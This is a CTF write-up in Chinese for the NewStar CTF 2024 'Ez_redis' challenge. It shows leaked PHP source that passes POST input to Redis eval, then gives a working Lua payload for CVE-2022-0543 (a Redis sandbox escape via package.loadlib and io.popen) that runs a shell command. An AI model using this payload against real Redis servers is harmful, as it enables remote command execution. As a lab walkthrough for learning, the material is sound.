---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# Ez_redis

考了个 Redis 命令执⾏以及其历史漏洞

![redis 语法示例](/assets/images/wp/2024/week5/ez_redis_1.png)

在这里其实给出了示例，结合题目不难发现就是个 Redis 语法

如果你有信息收集意识的话还会发现有源码泄露，访问 `/www.zip` 即可

关键点在：

```php
<?php
if(isset($_POST['eval'])){
    $cmd = $_POST['eval'];
    if(preg_match("/set|php/i", $cmd))
    {
        $cmd = 'return "u are not newstar";';
    }

    $example = new Redis();
    $example->connect($REDIS_HOST);
    $result = json_encode($example->eval($cmd));

    echo '<h1 class="subtitle">结果</h1>';
    echo "<pre>$result</pre>";
}
?>
```

搜索 Redis 常⽤利⽤⽅法，发现如果过滤了 `set` `php`，那么我们很难通过写 webshell，写⼊计划任务、主从复制来进行 getshell

于是我们搜索⼀下 Redis 5 的历史漏洞

发现 CVE-2022-0543 值得⼀试: [Redis Lua 沙盒绕过命令执行（CVE-2022-0543）](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md)

于是我们得到了⼀个 payload:

```lua
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

由于我们⽹站执⾏的是 redis 命令

于是去掉外⾯的 eval 即可

```lua
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res
```

![获取到 flag](/assets/images/wp/2024/week5/ez_redis_2.png)
